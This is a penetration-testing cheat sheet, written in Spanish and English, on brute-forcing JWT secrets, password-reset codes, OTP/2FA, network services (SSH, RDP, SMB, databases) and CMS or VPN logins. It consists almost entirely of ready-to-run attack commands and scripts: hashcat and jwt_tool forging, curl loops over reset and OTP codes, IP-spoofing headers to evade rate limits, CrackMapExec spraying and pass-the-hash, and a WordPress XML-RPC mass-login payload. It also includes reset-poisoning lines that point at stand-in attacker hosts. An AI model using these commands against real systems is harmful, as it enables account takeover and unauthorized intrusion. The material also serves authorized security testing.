---
aliases:
  - JWT Brute
  - SSH Brute
  - RDP Brute
  - SMB Brute
  - WordPress Brute
tags:
  - vuln/brute-force
  - technique/credential-access
  - asset/web-app
primary categories:
secondary categories:
tertiary categories:
kind: SubCheatSheet
linked:
  - "[[HTTP Brute Forcing]]"
  - "[[JWT Attacks]]"
  - "[[WordPress Exploitation]]"
---
# HTTP Brute Forcing - Tipos Especiales

***

## JWT Secret Crack

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt` | HS256 secret crack GPU | Most common JWT. |
| `hashcat -a 0 -m 16511 jwt.txt rockyou.txt` | HS384 variant | Alt algorithm. |
| `hashcat -a 0 -m 16512 jwt.txt rockyou.txt` | HS512 variant | Alt algorithm. |
| `python3 jwt_tool.py "$JWT" -C -d rockyou.txt` | jwt_tool dict attack | Python CPU. |
| `python3 jwt_tool.py "$JWT" -X a` | alg=none forge | Misconfig direct forge. |
| `python3 jwt_tool.py "$JWT" -X k -pk pubkey.pem` | RS256→HS256 confusion | Alg confusion. |
| `john --format=HMAC-SHA256 jwt.txt --wordlist=rockyou.txt` | John CPU crack | Sin GPU. |
| `hashcat -a 0 -m 16500 jwt.txt secrets.txt` con custom dict `secret/your-256-bit-secret/jwt-secret` | Common defaults probe | Lazy devs. |
| `grep -rE 'JWT_SECRET\|jwt[._]secret' ~/repo/ 2>/dev/null` | Source leak audit | Pre-brute OSINT. |
| `apktool d app.apk && grep -rE 'secret\|key' app/` | Mobile APK embedded secret | Mobile recon. |
| `curl -s https://target/.env \| grep -i jwt` | Env leak via misconfig | Env file exposed. |
| `python3 jwt_tool.py "$JWT" -I -hc kid -hv '../../../dev/null' -S hs256 -p ''` | kid path traversal forge | kid header attack. |
| `python3 jwt_tool.py "$JWT" -I -hc kid -hv "1' UNION SELECT 'secret'-- -" -S hs256 -p 'secret'` | kid SQLi forge | kid DB lookup. |
^bf-special-jwt

### JWT brute workflow

```bash
JWT="eyJhbGciOiJIUzI1NiI..."
echo "$JWT" > jwt.txt

# 1. GPU crack
hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt

# 2. With rules
hashcat -a 0 -m 16500 jwt.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# 3. Mask attack 8-char alnum
hashcat -a 3 -m 16500 jwt.txt '?a?a?a?a?a?a?a?a'

# 4. Verify cracked
hashcat -m 16500 jwt.txt --show
```

___

## Password Reset Token Brute

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `for c in {0000..9999}; do curl -s -d "email=victim@target.com&code=$c" https://target/reset/verify \| grep -q success && echo "FOUND $c"; done` | 4-digit numeric reset brute | 10K combos, SMS-style. |
| `seq -w 0 999999 \| xargs -P 50 -I{} curl -s -d "email=victim&code={}" https://target/reset/verify` | 6-digit parallel brute | 1M combos via xargs. |
| `ffuf -w codes.txt -X POST -u https://target/reset/verify -d "email=victim&code=FUZZ" -fc 401 -t 100` | ffuf parallel reset brute | Modern fuzzer. |
| `curl -s "https://target/reset?email=victim&token=$(date +%s \| md5sum \| cut -c1-8)" \| grep success` | Predictable timestamp-MD5 token | Reverse engineer. |
| `for i in {1..1000}; do curl -s "https://target/reset?token=$(echo -n "$EMAIL$(date +%s)" \| md5sum)" ; done` | Email+timestamp predictable | Predictable RNG. |
| `python3 -c "import requests; [requests.get(f'https://target/reset?token={hex(i)}') for i in range(0xa000, 0xffff)]"` | Sequential token increment | Insecure sequential. |
| `curl -i "https://target/reset?email=victim@target.com&token=test"` (no token check) | Auth bypass via missing token validation | Misconfig direct. |
| Turbo Intruder `concurrentConnections=100, requestsPerConnection=100` con `code` param | Race attack on validation | Single-Packet attack. |
| `curl -H "X-Forwarded-For: $(shuf -i 1-255 -n 1).$(shuf -i 1-255 -n 1).$(shuf -i 1-255 -n 1).$(shuf -i 1-255 -n 1)" -d "code=$CODE" https://target/reset` | IP rotation for per-IP limit | Per-IP only. |
| `curl -X POST -d "email=victim%0aattacker@evil.com&action=reset" https://target/reset` | CRLF in email field — leak token | CRLF combo. |
| `curl "https://target/reset?email=victim" -H "Host: attacker.com"` | Host header poisoning | HHI combo password reset. |
^bf-special-resettoken

### 6-digit reset code brute (bash)

```bash
EMAIL="victim@target.com"
curl -s -c cookies.txt https://target/forgot -d "email=$EMAIL"

for code in {000000..999999}; do
  RESP=$(curl -s -b cookies.txt \
    -X POST https://target/reset/verify \
    -d "email=$EMAIL&code=$code" \
    -o /dev/null -w "%{http_code}")
  [ "$RESP" = "200" ] && { echo "FOUND: $code"; break; }
done
```

___

## OTP / 2FA Brute

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `for c in {000000..999999}; do curl -s -b cookies.txt -d "otp=$c" https://target/2fa/verify \| grep -q success && echo "FOUND $c"; done` | TOTP 6-digit serial brute | 1M combos, drift 30s window. |
| `for c in {0000..9999}; do curl -s -b cookies.txt -d "otp=$c" https://target/2fa/verify; done` | TOTP 4-digit trivial | 10K — trivial burst. |
| Turbo Intruder `concurrentConnections=200, requestsPerConnection=100, pipeline=False` con `otp` 000000-999999 | Race attack single-packet | Single-Packet attack. |
| `python3 -c "import requests, concurrent.futures; e=concurrent.futures.ThreadPoolExecutor(100); [e.submit(requests.post, 'https://target/2fa', data={'otp': f'{i:06d}'}) for i in range(1000000)]"` | Python parallel 100 threads | Parallel brute. |
| `ffuf -w <(seq -w 0 999999) -X POST -b "session=$SESS" -u https://target/2fa -d "otp=FUZZ" -fc 401 -t 200` | ffuf 200 threads | Modern. |
| `for c in $(cat backup-codes-format.txt); do curl -s -b cookies.txt -d "code=$c" https://target/2fa/backup; done` | Backup recovery code brute | 8-10 chars. |
| `curl -X POST -d "username=admin&password=$PASS&skip2fa=true" https://target/login` | Flow gap — skip 2FA param | Logic bypass. |
| `curl -X POST -d "email=victim@target.com" https://target/forgot -b "post-2fa-session=..."` | MFA bypass via password reset flow | Reset-bypass-MFA combo. |
| `curl -X POST -d "refresh_token=$RT" https://target/oauth/refresh` (sin MFA check) | Refresh token bypasses MFA | OAuth refresh combo. |
| `curl -X POST -d "grant_type=password&username=admin&password=$P" https://target/oauth/token` (sin 2FA) | OAuth password grant skips MFA | OAuth flow gap. |
| `curl -i -b cookies.txt -d "otp=123456" https://target/2fa/verify` luego `curl -i -b cookies.txt -d "otp=123456" https://target/2fa/verify` | Code reuse — same code accepted N times | Misconfig. |
^bf-special-otp

### OTP race con Turbo Intruder

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=100,
                           requestsPerConnection=100,
                           pipeline=False)
    for code in range(1000000):
        engine.queue(target.req, "%06d" % code)

def handleResponse(req, interesting):
    if req.status != 401:
        table.add(req)
```

___

## SSH / RDP / SMB / FTP Brute

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `hydra -L users.txt -P pass.txt ssh://target -t 4` | SSH brute 4 threads | Slow TCP handshake. |
| `python3 ssh2john.py id_rsa > id_rsa.john && john --wordlist=rockyou.txt id_rsa.john` | SSH encrypted key crack | Captured private key. |
| `crowbar -b rdp -u admin -C pass.txt -s target/32` | RDP brute con crowbar | Or hydra. |
| `hydra -L users.txt -P pass.txt rdp://target` | RDP via hydra | Alt RDP. |
| `crackmapexec smb target -u users.txt -p pass.txt --continue-on-success` | SMB brute multi-pass | Domain auth. |
| `enum4linux -a target` | SMB null session check pre-brute | Pre-attack. |
| `crackmapexec smb target -u '' -p ''` | SMB null bind check | First step. |
| `hydra -L users.txt -P pass.txt ftp://target` | FTP brute | Anonymous first. |
| `curl -u anonymous:anonymous ftp://target/` | FTP anon check pre-brute | Recon. |
| `hydra -L users.txt -P pass.txt telnet://target` | Telnet legacy | Legacy systems. |
| `hydra -L users.txt -P pass.txt mysql://target` | MySQL brute | Adjacent DB. |
| `hydra -L users.txt -P pass.txt postgres://target` | PostgreSQL brute | Adjacent DB. |
| `hydra -L users.txt -P pass.txt mssql://target` | MSSQL brute | Windows. |
| `mongo --host target --eval "db.adminCommand('listDatabases')"` | MongoDB no auth check | Default no auth. |
| `redis-cli -h target -p 6379 INFO` | Redis no auth check | Default no auth. |
| `hydra -P pass.txt vnc://target` | VNC pass-only brute | No user. |
| `hydra -L users.txt -P pass.txt ldap2://target` | LDAP bind brute | Directory. |
| `crackmapexec winrm target -u users.txt -p pass.txt` | WinRM lateral | Modern Win remote. |
| `GetNPUsers.py CONTOSO.LOCAL/ -dc-ip target -usersfile users.txt -format hashcat` | AS-REP roast — list users no preauth | Pre-AD combo. |
^bf-special-services

### CrackMapExec SMB brute multi-host

```bash
# Single user spray rango
crackmapexec smb 10.10.10.0/24 -u admin -p Password123!

# Multi user multi pass
crackmapexec smb 10.10.10.0/24 -u users.txt -p passwords.txt --continue-on-success

# AD con domain
crackmapexec smb 10.10.10.0/24 -u admin -p Password123! -d CONTOSO.LOCAL

# Pass-the-hash
crackmapexec smb 10.10.10.0/24 -u admin -H aad3b435b51404eeaad3b435b51404ee:hash
```

___

## App-Specific (WordPress, Joomla, etc.)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `hydra -L users.txt -P pass.txt target.com http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username"` | WordPress wp-login brute | Standard WP. |
| `wpscan --url https://target --usernames users.txt --passwords pass.txt --max-threads 50` | WPScan password attack | WP-specific. |
| `curl -X POST -d "<?xml version=\"1.0\"?><methodCall><methodName>system.multicall</methodName>..." https://target/xmlrpc.php` (1500 attempts/req) | WordPress XML-RPC mass brute bypass rate limit | XML-RPC enabled. |
| `curl -s https://target/wp-json/wp/v2/users \| jq -r '.[].slug'` | WP REST API user enum pre-brute | Pre-attack recon. |
| `hydra -l admin -P pass.txt target.com http-post-form "/administrator/index.php:username=^USER^&passwd=^PASS^&task=login:F=Invalid"` | Joomla admin brute | Joomla CMS. |
| `hydra -l admin -P pass.txt target.com http-post-form "/user/login:name=^USER^&pass=^PASS^&form_id=user_login:F=password"` | Drupal user/login brute | Drupal CMS. |
| `hydra -l admin -P pass.txt target.com http-post-form "/admin/admin/index/index/key/HASHKEY/:login[username]=^USER^&login[password]=^PASS^:F=Invalid"` | Magento admin brute | E-commerce. |
| `hydra -l tomcat -P pass.txt -s 8080 target http-get /manager/html` | Tomcat manager Basic Auth | Default `tomcat:tomcat`. |
| `curl -s -c jar.txt https://target/login -G \| grep crumb && hydra -l admin -P pass.txt target http-post-form "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&Jenkins-Crumb=CRUMB:F=Invalid"` | Jenkins login (CSRF crumb required) | CI/CD. |
| `hydra -l admin -P pass.txt target https-post-form "/users/sign_in:user[login]=^USER^&user[password]=^PASS^:F=Invalid"` (con CSRF + cookie) | GitLab login brute | GitLab CE. |
| `hydra -L users.txt -P pass.txt target https-post-form "/login.jsp:os_username=^USER^&os_password=^PASS^:F=Could not authenticate"` | Confluence/Jira Atlassian | Atlassian. |
| `nuclei -t http/cves/2019/CVE-2019-19781.yaml -u https://target` (Citrix scan first) | Citrix NetScaler login pre-attack | VPN access. |
| `hydra -L users.txt -P pass.txt target https-post-form "/remote/logincheck:username=^USER^&credential=^PASS^&ajax=1:F=failed"` | FortiGate SSL VPN brute | VPN. |
| `hydra -L users.txt -P pass.txt target https-post-form "/dana-na/auth/url_default/login.cgi:username=^USER^&password=^PASS^&realm=Users:F=failed"` | Pulse Secure VPN brute | VPN. |
| `hydra -L users.txt -P pass.txt target https-post-form "/owa/auth.owa:destination=https://target/owa&flags=4&username=^USER^&password=^PASS^:F=Invalid"` | OWA Exchange brute | Email portal. |
| `hydra -L users.txt -P pass.txt target https-post-form "/adfs/ls/:UserName=^USER^&Password=^PASS^&AuthMethod=FormsAuthentication:F=Incorrect"` | ADFS federation brute | Federation. |
^bf-special-apps

### WordPress XML-RPC mass brute (1500 passwords/request)

```bash
# Genera payload con 1500 contraseñas en un solo request
{
  echo '<?xml version="1.0"?>'
  echo '<methodCall><methodName>system.multicall</methodName>'
  echo '<params><param><value><array><data>'
  while read -r pass; do
    cat <<XML
<value><struct>
  <member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>
  <member><name>params</name><value><array><data>
    <value><array><data>
      <value><string>admin</string></value>
      <value><string>$pass</string></value>
    </data></array></value>
  </data></array></value></member>
</struct></value>
XML
  done < <(head -1500 passwords.txt)
  echo '</data></array></value></param></params></methodCall>'
} > xmlrpc.xml

curl -X POST -H "Content-Type: text/xml" --data @xmlrpc.xml https://target/xmlrpc.php \
  | grep -B2 'faultCode</name>' | grep -v fault
```

***
